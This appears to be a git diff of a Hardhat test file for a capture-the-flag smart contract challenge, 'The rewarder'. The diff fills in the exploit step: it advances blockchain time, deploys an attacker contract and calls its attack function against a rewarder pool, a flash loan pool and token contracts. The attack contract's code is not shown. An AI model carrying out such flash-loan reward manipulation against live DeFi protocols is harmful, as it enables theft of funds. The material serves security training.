@@ -1,4 +1,5 @@
 const { ethers } = require('hardhat');
+const { time } = require("@openzeppelin/test-helpers");
 const { expect } = require('chai');
 
 describe('[Challenge] The rewarder', function () {
@@ -65,7 +66,16 @@ describe('[Challenge] The rewarder', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+
+        // Advance time by more than 5 days so that depositors can get rewards
+        await network.provider.send("evm_increaseTime", [2000000])
+    
+        // deploy attacker contract from attacker address
+        const RewarderAttackContract = await ethers.getContractFactory('RewarderAttackContract', attacker);
+        this.attacker = await RewarderAttackContract.deploy();
+
+        // attack in a single transaction
+        await this.attacker.attack(this.rewarderPool.address, this.flashLoanPool.address, this.rewardToken.address, this.liquidityToken.address);
     });
 
     after(async function () {
